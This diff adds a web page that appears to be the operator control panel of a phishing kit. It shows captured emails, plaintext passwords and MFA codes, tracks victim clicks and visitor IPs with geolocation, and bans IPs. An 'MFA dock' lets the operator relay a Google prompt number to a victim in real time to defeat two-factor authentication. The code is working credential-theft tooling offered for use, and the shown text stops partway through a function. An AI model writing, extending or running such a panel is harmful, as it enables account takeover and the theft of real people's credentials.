@@ -1,0 +1,2778 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Control Center</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --blue: #007aff;
+      --blue-soft: rgba(0,122,255,0.1);
+      --red: #ff3b30;
+      --red-soft: rgba(255,59,48,0.1);
+      --green: #34c759;
+      --green-soft: rgba(52,199,89,0.1);
+      --yellow: #ff9f0a;
+      --yellow-soft: rgba(255,159,10,0.1);
+      --purple: #af52de;
+      --purple-soft: rgba(175,82,222,0.1);
+      --border: rgba(0,0,0,0.06);
+      --glass: rgba(255,255,255,0.72);
+      --glass-heavy: rgba(255,255,255,0.85);
+      --bg: #f2f2f7;
+      --text: #1c1c1e;
+      --text-dim: #636366;
+      --text-mute: #aeaeb2;
+      --radius: 14px;
+      --blur: blur(20px) saturate(180%);
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, 'SF Pro Display', 'Inter', BlinkMacSystemFont, sans-serif;
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+    }
+    body::before {
+      content: '';
+      position: fixed; top: -50%; left: -50%; width: 200%; height: 200%;
+      background: radial-gradient(ellipse at 20% 20%, rgba(0,122,255,0.08) 0%, transparent 50%),
+                  radial-gradient(ellipse at 80% 80%, rgba(175,82,222,0.06) 0%, transparent 50%),
+                  radial-gradient(ellipse at 50% 0%, rgba(255,159,10,0.05) 0%, transparent 40%);
+      z-index: -1;
+      animation: bgShift 20s ease-in-out infinite alternate;
+    }
+    @keyframes bgShift { 0% { transform: translate(0,0); } 100% { transform: translate(-3%,-2%); } }
+
+    /* Topbar */
+    .topbar {
+      background: var(--glass);
+      backdrop-filter: var(--blur);
+      -webkit-backdrop-filter: var(--blur);
+      border-bottom: 1px solid var(--border);
+      position: sticky; top: 0; z-index: 100;
+    }
+    .topbar-inner {
+      max-width: 960px;
+      margin: 0 auto;
+      padding: 12px 24px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .topbar-left { display: flex; align-items: center; gap: 12px; }
+    .topbar-logo {
+      width: 34px; height: 34px;
+      background: linear-gradient(135deg, var(--blue) 0%, #5856d6 100%);
+      border-radius: 10px; display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 2px 8px rgba(0,122,255,0.3);
+    }
+    .topbar-logo svg { width: 17px; height: 17px; }
+    .topbar h1 { font-size: 16px; font-weight: 700; letter-spacing: -0.02em; }
+    .topbar-right { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+    .live { display: flex; align-items: center; gap: 6px; font-size: 11px; color: var(--green); font-weight: 600; }
+    .live-dot { width: 7px; height: 7px; background: var(--green); border-radius: 50%; animation: pulse 2s infinite; box-shadow: 0 0 6px var(--green); }
+    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+    .top-btn {
+      padding: 6px 14px; border: none; border-radius: 10px;
+      background: rgba(0,0,0,0.04); color: var(--text-dim); cursor: pointer;
+      font-size: 12px; font-weight: 600; font-family: inherit;
+      text-decoration: none; display: inline-flex; align-items: center; gap: 5px;
+      transition: all 200ms cubic-bezier(.4,0,.2,1);
+    }
+    .top-btn:hover { background: rgba(0,0,0,0.08); color: var(--text); }
+
+    /* Container */
+    .container { max-width: 1600px; margin: 0 auto; padding: 24px 20px; }
+
+    /* Stats */
+    .stats { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; margin-bottom: 24px; }
+    .stat {
+      background: var(--glass-heavy);
+      backdrop-filter: var(--blur);
+      -webkit-backdrop-filter: var(--blur);
+      border: 1px solid var(--border);
+      border-radius: var(--radius); padding: 18px;
+      cursor: pointer; transition: all 250ms cubic-bezier(.4,0,.2,1);
+    }
+    .stat:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,0,0,0.06); }
+    .stat:active { transform: scale(0.98); }
+    .stat .num { font-size: 26px; font-weight: 800; letter-spacing: -0.03em; margin-bottom: 2px; }
+    .stat .label { font-size: 11px; color: var(--text-mute); font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px; }
+    .stat.red .num { color: var(--red); }
+    .stat.green .num { color: var(--green); }
+    .stat.blue .num { color: var(--blue); }
+    .stat.yellow .num { color: var(--yellow); }
+    .stat.purple .num { color: var(--purple); }
+
+    /* Tabs */
+    .tabs {
+      display: flex; gap: 4px; margin-bottom: 20px; overflow-x: auto;
+      background: rgba(0,0,0,0.04); border-radius: 12px; padding: 3px;
+      scrollbar-width: none;
+    }
+    .tabs::-webkit-scrollbar { display: none; }
+    .tab {
+      padding: 8px 16px; font-size: 13px; font-weight: 600; color: var(--text-mute);
+      cursor: pointer; border-radius: 10px; transition: all 200ms cubic-bezier(.4,0,.2,1);
+      display: flex; align-items: center; gap: 5px; white-space: nowrap;
+      border: none;
+    }
+    .tab:hover { color: var(--text-dim); }
+    .tab.active {
+      color: var(--text); background: #fff;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.06), 0 1px 2px rgba(0,0,0,0.04);
+    }
+
+    /* Panels */
+    .panel { display: none; animation: panelIn 300ms ease; }
+    .panel.active { display: block; }
+    @keyframes panelIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+
+    /* Table */
+    .table-card {
+      background: var(--glass-heavy); backdrop-filter: var(--blur);
+      -webkit-backdrop-filter: var(--blur);
+      border: 1px solid var(--border); border-radius: var(--radius); overflow-x: auto;
+    }
+    table { width: 100%; border-collapse: collapse; font-size: 13px; }
+    th {
+      text-align: left; padding: 8px 10px; color: var(--text-mute);
+      font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;
+      background: rgba(0,0,0,0.02); border-bottom: 1px solid var(--border);
+    }
+    td { padding: 10px 10px; border-bottom: 1px solid rgba(0,0,0,0.03); }
+    tr:last-child td { border-bottom: none; }
+    tr:hover td { background: rgba(0,122,255,0.03); }
+
+    /* Badge */
+    .badge {
+      display: inline-flex; align-items: center; gap: 4px;
+      padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700;
+    }
+    .badge.red { background: var(--red-soft); color: var(--red); }
+    .badge.green { background: var(--green-soft); color: var(--green); }
+    .badge.yellow { background: var(--yellow-soft); color: var(--yellow); }
+    .badge.blue { background: var(--blue-soft); color: var(--blue); }
+    .badge.purple { background: var(--purple-soft); color: var(--purple); }
+
+    /* Buttons */
+    .btn {
+      padding: 7px 14px; border: none; border-radius: 10px;
+      background: rgba(0,0,0,0.04); color: var(--text-dim); cursor: pointer;
+      font-size: 12px; font-weight: 600; font-family: inherit;
+      transition: all 200ms cubic-bezier(.4,0,.2,1);
+    }
+    .btn:hover { background: rgba(0,0,0,0.08); color: var(--text); }
+    .btn:active { transform: scale(0.96); }
+    .btn.green { color: var(--green); background: var(--green-soft); }
+    .btn.green:hover { background: rgba(52,199,89,0.18); }
+    .btn.red { color: var(--red); background: var(--red-soft); }
+    .btn.red:hover { background: rgba(255,59,48,0.18); }
+    .btn.blue { color: #fff; background: var(--blue); }
+    .btn.blue:hover { background: #0066e0; box-shadow: 0 4px 12px rgba(0,122,255,0.3); }
+
+    /* Collapsible dropbox */
+    .dropbox {
+      background: var(--glass-heavy); backdrop-filter: var(--blur); -webkit-backdrop-filter: var(--blur);
+      border: 1px solid var(--border); border-radius: var(--radius); margin-bottom: 12px; overflow: hidden;
+      transition: box-shadow 200ms ease;
+    }
+    .dropbox[open] { box-shadow: 0 4px 16px rgba(0,0,0,0.06); }
+    .dropbox > summary {
+      list-style: none; cursor: pointer; padding: 14px 18px;
+      display: flex; align-items: center; gap: 10px;
+      font-size: 14px; font-weight: 700; color: var(--text);
+      user-select: none; transition: background 150ms ease;
+    }
+    .dropbox > summary::-webkit-details-marker { display: none; }
+    .dropbox > summary:hover { background: rgba(0,0,0,0.02); }
+    .dropbox > summary .chev {
+      margin-left: auto; transition: transform 200ms ease; color: var(--text-mute); font-size: 12px;
+    }
+    .dropbox[open] > summary .chev { transform: rotate(90deg); }
+    .dropbox > summary .count {
+      display: inline-flex; align-items: center; justify-content: center;
+      min-width: 22px; height: 22px; padding: 0 8px; border-radius: 11px;
+      background: var(--blue-soft); color: var(--blue);
+      font-size: 11px; font-weight: 700;
+    }
+    .dropbox > .dropbox-body {
+      padding: 0 18px 16px; border-top: 1px solid var(--border);
+      animation: dropboxIn 200ms ease;
+    }
+    @keyframes dropboxIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
+    .dropbox-actions { display: flex; justify-content: flex-end; gap: 8px; margin: 12px 0 6px; }
+
+    /* Empty */
+    .empty { text-align: center; padding: 48px 24px; color: var(--text-mute); }
+    .empty i { font-size: 32px; margin-bottom: 12px; display: block; opacity: 0.2; }
+    .empty p { font-size: 14px; font-weight: 500; }
+
+    .sa-only { display: none !important; }
+    body.is-superadmin .sa-only.tab { display: flex !important; }
+    body.is-superadmin .sa-only.panel { display: none !important; }
+    body.is-superadmin .sa-only.panel.active { display: block !important; }
+
+    /* User / invite forms */
+    .user-form {
+      background: var(--glass-heavy); backdrop-filter: var(--blur);
+      -webkit-backdrop-filter: var(--blur);
+      border: 1px solid var(--border); border-radius: var(--radius);
+      padding: 20px; margin-bottom: 16px;
+    }
+    .user-form h3 { font-size: 14px; font-weight: 700; margin-bottom: 16px; }
+    .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .form-field { display: flex; flex-direction: column; gap: 4px; }
+    .form-field label { font-size: 12px; font-weight: 600; color: var(--text-dim); }
+    .form-field input, .form-field select, .form-field textarea {
+      padding: 10px 14px; border: 1px solid var(--border); border-radius: 10px;
+      font-size: 13px; font-family: inherit; outline: none;
+      background: rgba(255,255,255,0.8); transition: all 200ms;
+    }
+    .form-field input:focus, .form-field select:focus, .form-field textarea:focus {
+      border-color: var(--blue); box-shadow: 0 0 0 3px var(--blue-soft);
+      background: #fff;
+    }
+    .form-field textarea { resize: vertical; min-height: 60px; }
+    .form-field small { font-size: 11px; color: var(--text-mute); }
+    .form-actions { margin-top: 14px; display: flex; gap: 8px; align-items: center; }
+    .form-msg { font-size: 12px; margin-left: 8px; }
+
+    /* Card list (logins, bans, strikes, clients, learned) */
+    .login-list { display: flex; flex-direction: column; gap: 8px; }
+    .login-card {
+      background: var(--glass-heavy);
+      backdrop-filter: var(--blur);
+      -webkit-backdrop-filter: var(--blur);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 14px 18px;
+      transition: all 200ms cubic-bezier(.4,0,.2,1);
+    }
+    .login-card:hover { transform: translateY(-1px); box-shadow: 0 4px 16px rgba(0,0,0,0.05); }
+    .login-top { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; flex-wrap: wrap; }
+    .login-email { font-weight: 700; font-size: 14px; color: var(--text); }
+    .login-pass {
+      background: var(--red-soft); color: var(--red); padding: 4px 12px;
+      border-radius: 8px; font-size: 13px; font-family: 'SF Mono', 'Courier New', monospace;
+      font-weight: 700; word-break: break-all;
+    }
+    .login-meta { display: flex; gap: 16px; flex-wrap: wrap; font-size: 12px; color: var(--text-mute); font-weight: 500; }
+    .login-meta span { display: inline-flex; align-items: center; gap: 5px; }
+
+    @media (max-width: 640px) {
+      .stats { grid-template-columns: repeat(2, 1fr); }
+      .form-grid { grid-template-columns: 1fr; }
+      .topbar-inner { flex-wrap: wrap; gap: 8px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="topbar">
+    <div class="topbar-inner">
+      <div class="topbar-left">
+        <div class="topbar-logo">
+          <svg viewBox="0 0 24 24" fill="none"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+        <h1>Control Center</h1>
+      </div>
+      <div class="topbar-right">
+        <span class="live"><span class="live-dot"></span> Live</span>
+        <span id="topbar-user" style="font-size:12px;color:var(--text-dim);"></span>
+        <button class="top-btn" onclick="loadAll()"><i class="fas fa-rotate"></i> Refresh</button>
+        <a class="top-btn" onclick="location.href=BASE+'/logout'" href="#"><i class="fas fa-arrow-right-from-bracket"></i> Sign out</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="stats" id="stats"></div>
+
+    <div class="tabs" id="tabs">
+      <div class="tab active" onclick="switchTab('logins',this)"><i class="fas fa-key" style="margin-right:4px"></i>Logins</div>
+      <div class="tab" onclick="switchTab('banned',this)">Banned IPs</div>
+      <div class="tab" onclick="switchTab('strikes',this)">Strikes</div>
+      <div class="tab" onclick="switchTab('links',this)"><i class="fas fa-link" style="margin-right:4px"></i>Links</div>
+      <div class="tab sa-only" onclick="switchTab('learned',this)">Learned</div>
+      <div class="tab sa-only" onclick="switchTab('providers',this)">Providers</div>
+      <div class="tab sa-only" onclick="switchTab('users',this)"><i class="fas fa-users" style="margin-right:4px"></i>Users</div>
+      <div class="tab" onclick="switchTab('settings',this)"><i class="fas fa-gear" style="margin-right:4px"></i>Settings</div>
+    </div>
+
+    <div class="panel active" id="p-logins"></div>
+    <div class="panel" id="p-banned"></div>
+    <div class="panel" id="p-strikes"></div>
+    <div class="panel" id="p-links"></div>
+    <div class="panel sa-only" id="p-learned"></div>
+    <div class="panel sa-only" id="p-providers"></div>
+    <div class="panel sa-only" id="p-users"></div>
+    <div class="panel" id="p-settings"></div>
+  </div>
+
+  <!-- Toast + Modal system (replaces native alert/confirm) -->
+  <div id="cc-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:9999;align-items:center;justify-content:center;backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);animation:ccFade .15s ease-out;">
+    <div style="background:#fff;border-radius:18px;max-width:420px;width:90%;padding:26px 24px 20px;box-shadow:0 24px 60px rgba(0,0,0,.22);font-family:-apple-system,'SF Pro Display','Inter',BlinkMacSystemFont,sans-serif;animation:ccPop .18s cubic-bezier(.2,.8,.3,1.2);">
+      <div id="cc-modal-icon" style="width:44px;height:44px;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;border-radius:50%;font-size:20px;"></div>
+      <h3 id="cc-modal-title" style="margin:0 0 8px;font-size:17px;font-weight:700;text-align:center;color:#1c1c1e;"></h3>
+      <p id="cc-modal-body" style="margin:0 0 20px;font-size:13.5px;color:#6b6b70;text-align:center;line-height:1.5;"></p>
+      <div id="cc-modal-actions" style="display:flex;gap:8px;"></div>
+    </div>
+  </div>
+  <div id="cc-toast" style="display:none;position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:10000;padding:12px 20px;border-radius:12px;font-family:-apple-system,'SF Pro Display','Inter',sans-serif;font-size:13.5px;font-weight:500;box-shadow:0 8px 24px rgba(0,0,0,.18);max-width:90vw;"></div>
+  <!-- Active Google MFA dock — appears when a victim is on the Google Prompt page; operator pushes the matching number from here. -->
+  <div id="mfa-dock" style="display:none;position:fixed;bottom:18px;right:18px;z-index:9999;width:340px;max-width:calc(100vw - 24px);font-family:-apple-system,'SF Pro Display','Inter',sans-serif;"></div>
+
+  <!-- Live Activity drawer — streams every server-side event (captures, MFA, links, bans) so the operator sees the campaign breathe in real time. -->
+  <button id="live-toggle" type="button" aria-label="Live activity" style="display:flex;align-items:center;justify-content:center;position:fixed;bottom:18px;left:18px;z-index:9999;width:48px;height:48px;border-radius:50%;border:none;background:#0a84ff;color:#fff;font-size:18px;cursor:pointer;box-shadow:0 8px 24px rgba(10,132,255,.35);font-family:-apple-system,'SF Pro Display','Inter',sans-serif;">
+    <i class="fas fa-bolt"></i>
+    <span id="live-badge" style="display:none;position:absolute;top:-4px;right:-4px;min-width:18px;height:18px;padding:0 5px;border-radius:9px;background:#ff3b30;color:#fff;font-size:11px;font-weight:700;line-height:18px;text-align:center;border:2px solid #fff;">0</span>
+  </button>
+  <div id="live-drawer" style="display:none;position:fixed;bottom:78px;left:18px;z-index:9998;width:360px;max-width:calc(100vw - 36px);height:min(560px, calc(100vh - 120px));background:#fff;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.18), 0 4px 12px rgba(0,0,0,.06);display:none;flex-direction:column;overflow:hidden;font-family:-apple-system,'SF Pro Display','Inter',sans-serif;">
+    <div style="display:flex;align-items:center;gap:8px;padding:14px 16px;border-bottom:1px solid #eef0f3;background:linear-gradient(180deg,#fafbfc,#fff);">
+      <span style="display:inline-flex;width:8px;height:8px;background:#22c55e;border-radius:50%;animation:liveDot 1.4s ease-in-out infinite;"></span>
+      <strong style="font-size:13px;color:#111827;">Live Activity</strong>
+      <span id="live-count" style="font-size:11px;color:#6b7280;font-weight:500;margin-left:auto;">0 events</span>
+      <button id="live-clear" type="button" title="Clear feed" style="border:0;background:transparent;color:#9ca3af;cursor:pointer;padding:4px 6px;font-size:13px;"><i class="fas fa-trash"></i></button>
+      <button id="live-close" type="button" title="Close" style="border:0;background:transparent;color:#6b7280;cursor:pointer;padding:4px 6px;font-size:14px;"><i class="fas fa-xmark"></i></button>
+    </div>
+    <div id="live-list" style="flex:1;overflow-y:auto;padding:6px 6px;background:#f9fafb;"></div>
+    <div style="padding:8px 14px;border-top:1px solid #eef0f3;font-size:10px;color:#9ca3af;text-align:center;background:#fff;">Streaming since this tab opened</div>
+  </div>
+  <style>
+    @keyframes liveDot { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:.5; transform:scale(.8); } }
+    @keyframes liveItemIn { from { opacity:0; transform:translateY(-6px); background:#fff7ed; } to { opacity:1; transform:translateY(0); background:#fff; } }
+    .live-row { display:flex; align-items:flex-start; gap:10px; padding:10px 12px; margin:4px 0; background:#fff; border-radius:10px; border-left:3px solid var(--lr-color, #9ca3af); animation: liveItemIn 1500ms cubic-bezier(.4,0,.2,1); }
+    .live-row .lr-icon { flex-shrink:0; width:28px; height:28px; border-radius:7px; background:var(--lr-bg, #f3f4f6); color:var(--lr-color, #6b7280); display:flex; align-items:center; justify-content:center; font-size:12px; }
+    .live-row .lr-body { flex:1; min-width:0; }
+    .live-row .lr-msg { font-size:12.5px; color:#111827; line-height:1.35; word-break:break-word; }
+    .live-row .lr-time { font-size:10px; color:#9ca3af; margin-top:2px; font-variant-numeric: tabular-nums; }
+    .live-row.lr-pulse { box-shadow: 0 0 0 0 rgba(10,132,255,.4); animation: liveItemIn 1500ms cubic-bezier(.4,0,.2,1), liveItemPulse 2.4s ease-out; }
+    @keyframes liveItemPulse { 0% { box-shadow: 0 0 0 0 rgba(10,132,255,.45); } 100% { box-shadow: 0 0 0 18px rgba(10,132,255,0); } }
+    #live-toggle.has-unread { animation: liveBtnPulse 1.6s ease-in-out infinite; }
+    @keyframes liveBtnPulse { 0%,100% { box-shadow: 0 8px 24px rgba(10,132,255,.35), 0 0 0 0 rgba(10,132,255,.35); } 50% { box-shadow: 0 8px 24px rgba(10,132,255,.35), 0 0 0 12px rgba(10,132,255,0); } }
+  </style>
+  <style>
+    @keyframes ccFade { from { opacity:0 } to { opacity:1 } }
+    @keyframes ccPop { from { transform:scale(.92); opacity:0 } to { transform:scale(1); opacity:1 } }
+    @keyframes ccToastIn { from { transform:translateX(-50%) translateY(-20px); opacity:0 } to { transform:translateX(-50%) translateY(0); opacity:1 } }
+    .cc-btn { flex:1; padding:11px 16px; border:0; border-radius:10px; font-size:14px; font-weight:600; font-family:inherit; cursor:pointer; transition:transform .1s, opacity .15s; }
+    .cc-btn:hover { opacity:.88 }
+    .cc-btn:active { transform:scale(.97) }
+    .cc-btn-primary { background:#0a84ff; color:#fff }
+    .cc-btn-danger { background:#ff3b30; color:#fff }
+    .cc-btn-cancel { background:#f2f2f7; color:#1c1c1e }
+  </style>
+
+<script>
+let currentUser = null;
+const isSA = () => currentUser && currentUser.role === 'superadmin';
+const J = 'application/json';
+const post = (url, body) => fetch(url, { method: 'POST', headers: { 'Content-Type': J }, body: JSON.stringify(body) });
+
+function switchTab(name, el) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.getElementById('p-' + name).classList.add('active');
+}
+
+function goTab(name) {
+  const tab = document.querySelector(`.tab[onclick*="'${name}'"]`);
+  if (tab) switchTab(name, tab);
+}
+
+const BASE = '/u';
+
+// ---- Realtime: SSE stream ----
+let _liveSse = null;
+// Returns true if the user has a generator form open or a result panel
+// showing in the Links tab. While busy, do NOT auto-refresh — that would
+// wipe their form / link / result panel.
+function isLinksTabBusy() {
+  const formC = document.getElementById('genlink-form-container');
+  const resultC = document.getElementById('genlink-result');
+  const linkDisplay = document.getElementById('invite-link-display');
+  if (formC && formC.innerHTML.trim()) return true;
+  if (resultC && resultC.innerHTML.trim()) return true;
+  if (linkDisplay && linkDisplay.innerHTML.trim()) return true;
+  return false;
+}
+
+function subscribeLive() {
+  try { if (_liveSse) _liveSse.close(); } catch {}
+  const es = new EventSource(BASE + '/api/stream');
+  _liveSse = es;
+  es.addEventListener('login', (e) => {
+    try {
+      const d = JSON.parse(e.data);
+      const cidTag = d.cid ? ' ['+d.cid+']' : '';
+      const cdmTag = d.cdm ? ' via '+d.cdm : '';
+      const labelByType = { email: '✉️ Email', password: '🔓 Password', mfa: '🔐 MFA' };
+      const label = labelByType[d.type] || '🔓 Password';
+      showToast(label + ' captured: ' + (d.email || d.ip) + cidTag + cdmTag, 'success');
+      pushLive(d.type === 'mfa' ? 'mfa-capture' : (d.type === 'password' ? 'pw-capture' : 'email-capture'),
+               `${label} captured`, `${d.email || d.ip}${cidTag}${cdmTag}`, true);
+    } catch {}
+    loadLogins(); loadAll();
+    // Skip the Links-tab refresh if the user is mid-generation (chameleon
+    // / inbox / convert form open) or has the success panel showing — a
+    // refresh would wipe their work.
+    if (!isLinksTabBusy()) loadLinks();
+  });
+  es.addEventListener('ban', (e) => {
+    try {
+      const d = JSON.parse(e.data);
+      showToast('🪤 IP trapped: ' + d.ip + ' (' + d.reason + ')', 'warn');
+      pushLive('ban', 'IP trapped', `${d.ip} — ${d.reason}`);
+    } catch {}
+    loadAll();
+  });
+  es.addEventListener('visitor', (e) => {
+    try {
+      const d = JSON.parse(e.data);
+      if (d.isNew) {
+        const flag = d.geo && d.geo.countryCode ? flagEmoji(d.geo.countryCode) + ' ' : '';
+        const loc  = d.geo && d.geo.city ? ` — ${d.geo.city}, ${d.geo.country || ''}` : (d.geo && d.geo.country ? ` — ${d.geo.country}` : '');
+        showToast(`👁 New visitor: ${flag}${d.ip || '?'}${loc}`, 'info');
+        pushLive('visitor', 'New visitor', `${flag}${d.ip || '?'}${loc}`);
+      }
+    } catch {}
+    if (!isLinksTabBusy()) loadLinks();
+  });
+  es.addEventListener('geo', () => {
+    // ASN/ISP arrived for a previously-seen IP — refresh the link cards if visible.
+    if (!isLinksTabBusy()) loadLinks();
+  });
+  es.addEventListener('mfa-presence', (e) => {
+    try {
+      const d = JSON.parse(e.data);
+      showToast('🟢 Victim on Google MFA: ' + (d.email || d.ip), 'info');
+      pushLive('mfa-presence', 'Victim on Google MFA', d.email || d.ip || '?', true);
+      // Layered hard-to-miss alerts: OS notification + audible chime + title pulse.
+      // Operator can be on another tab and still get pulled in.
+      mfaAlert(d.email || d.ip, d.ip || '');
+    } catch {}
+    loadActiveMfa();
+  });
+  es.addEventListener('mfa-push', (e) => {
+    try {
+      const d = JSON.parse(e.data);
+      pushLive('mfa-push', `Number ${d.number} pushed`, d.email || d.ip || '?');
+    } catch {}
+    loadActiveMfa();
+  });
+  es.addEventListener('linkstats', (e) => {
+    try {
+      const d = JSON.parse(e.data);
+      if (d && d.kind) {
+        const labels = { click: '🖱 Link clicked', open: '👀 Link opened', email: '📧 Email entered', password: '🔑 Password submitted', mfa: '🛡 MFA submitted' };
+        if (d.kind !== 'click' && d.kind !== 'open' && labels[d.kind]) {
+          showToast(labels[d.kind], d.kind === 'mfa' ? 'success' : 'info');
+        }
+        if (labels[d.kind]) {
+          pushLive('linkstats-' + d.kind, labels[d.kind], d.email || d.ip || '?',
+                   d.kind === 'mfa' || d.kind === 'password');
+        }
+      }
+    } catch {}
+    if (!isLinksTabBusy()) loadLinks();
+  });
+  es.onerror = () => {
+    // Auto-reconnect after 3s
+    try { es.close(); } catch {}
+    setTimeout(subscribeLive, 3000);
+  };
+}
+
+// ---- Live Activity drawer ----
+// Streams every SSE event into a scrollable feed. Closed by default; tag in
+// bottom-left flashes + badges with unread count when events land while
+// closed. Open it = mission-control feed of who's clicking, typing, getting
+// banned, hitting MFA, etc.
+const LIVE_MAX = 100;
+const _liveEvents = [];               // newest at index 0
+let _liveDrawerOpen = false;
+let _liveUnread = 0;
+
+const LIVE_TYPES = {
+  'email-capture':     { color: '#3b82f6', bg: '#eff6ff', icon: 'fa-envelope' },
+  'pw-capture':        { color: '#8b5cf6', bg: '#f5f3ff', icon: 'fa-key' },
+  'mfa-capture':       { color: '#22c55e', bg: '#dcfce7', icon: 'fa-shield-halved' },
+  'mfa-presence':      { color: '#0ea5e9', bg: '#e0f2fe', icon: 'fa-mobile-screen-button' },
+  'mfa-push':          { color: '#10b981', bg: '#d1fae5', icon: 'fa-bullseye' },
+  'visitor':           { color: '#6366f1', bg: '#eef2ff', icon: 'fa-eye' },
+  'ban':               { color: '#ef4444', bg: '#fee2e2', icon: 'fa-ban' },
+  'linkstats-click':   { color: '#a855f7', bg: '#faf5ff', icon: 'fa-arrow-pointer' },
+  'linkstats-open':    { color: '#a855f7', bg: '#faf5ff', icon: 'fa-folder-open' },
+  'linkstats-email':   { color: '#3b82f6', bg: '#eff6ff', icon: 'fa-envelope' },
+  'linkstats-password':{ color: '#8b5cf6', bg: '#f5f3ff', icon: 'fa-key' },
+  'linkstats-mfa':     { color: '#22c55e', bg: '#dcfce7', icon: 'fa-shield-halved' },
+};
+
+function pushLive(type, title, detail, pulse) {
+  const meta = LIVE_TYPES[type] || { color: '#9ca3af', bg: '#f3f4f6', icon: 'fa-circle' };
+  const entry = { type, title, detail, ts: Date.now(), meta, pulse: !!pulse };
+  _liveEvents.unshift(entry);
+  if (_liveEvents.length > LIVE_MAX) _liveEvents.length = LIVE_MAX;
+  if (!_liveDrawerOpen) {
+    _liveUnread++;
+    const badge = document.getElementById('live-badge');
+    if (badge) { badge.textContent = _liveUnread > 99 ? '99+' : String(_liveUnread); badge.style.display = ''; }
+    const btn = document.getElementById('live-toggle');
+    if (btn) btn.classList.add('has-unread');
+  }
+  renderLiveList();
+}
+
+function timeAgoShort(ts) {
+  const s = Math.max(0, Math.floor((Date.now() - ts) / 1000));
+  if (s < 5)   return 'just now';
+  if (s < 60)  return s + 's ago';
+  if (s < 3600) return Math.floor(s / 60) + 'm ago';
+  if (s < 86400) return Math.floor(s / 3600) + 'h ago';
+  return Math.floor(s / 86400) + 'd ago';
+}
+
+function escLive(s) { return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c])); }
+
+function renderLiveList() {
+  const list = document.getElementById('live-list');
+  const count = document.getElementById('live-count');
+  if (!list) return;
+  if (count) count.textContent = `${_liveEvents.length} event${_liveEvents.length === 1 ? '' : 's'}`;
+  if (_liveEvents.length === 0) {
+    list.innerHTML = '<div style="padding:36px 16px;text-align:center;color:#9ca3af;font-size:12px;"><i class="fas fa-bolt" style="display:block;font-size:22px;margin-bottom:8px;color:#d1d5db;"></i>Waiting for activity…</div>';
+    return;
+  }
+  list.innerHTML = _liveEvents.map(e => `
+    <div class="live-row${e.pulse ? ' lr-pulse' : ''}" style="--lr-color:${e.meta.color};--lr-bg:${e.meta.bg};">
+      <div class="lr-icon"><i class="fas ${e.meta.icon}"></i></div>
+      <div class="lr-body">
+        <div class="lr-msg"><strong style="color:${e.meta.color}">${escLive(e.title)}</strong>${e.detail ? ' — ' + escLive(e.detail) : ''}</div>
+        <div class="lr-time" data-live-ts="${e.ts}">${timeAgoShort(e.ts)}</div>
+      </div>
+    </div>`).join('');
+}
+
+function toggleLiveDrawer(open) {
+  const drawer = document.getElementById('live-drawer');
+  const btn = document.getElementById('live-toggle');
+  const badge = document.getElementById('live-badge');
+  if (!drawer) return;
+  _liveDrawerOpen = (open === undefined) ? drawer.style.display === 'none' : !!open;
+  drawer.style.display = _liveDrawerOpen ? 'flex' : 'none';
+  if (_liveDrawerOpen) {
+    _liveUnread = 0;
+    if (badge) badge.style.display = 'none';
+    if (btn) btn.classList.remove('has-unread');
+    renderLiveList();
+  }
+}
+document.addEventListener('DOMContentLoaded', () => {
+  const tBtn = document.getElementById('live-toggle');
+  const cBtn = document.getElementById('live-close');
+  const xBtn = document.getElementById('live-clear');
+  if (tBtn) tBtn.addEventListener('click', () => toggleLiveDrawer());
+  if (cBtn) cBtn.addEventListener('click', () => toggleLiveDrawer(false));
+  if (xBtn) xBtn.addEventListener('click', () => { _liveEvents.length = 0; renderLiveList(); });
+});
+// Refresh time-ago labels every 15s without re-rendering the whole list.
+setInterval(() => {
+  document.querySelectorAll('.lr-time[data-live-ts]').forEach(el => {
+    const ts = parseInt(el.dataset.liveTs, 10);
+    if (ts) el.textContent = timeAgoShort(ts);
+  });
+}, 15000);
+
+// ---- Modal / Toast system (replaces native alert/confirm) ----
+function showToast(msg, type) {
+  const t = document.getElementById('cc-toast');
+  if (!t) return;
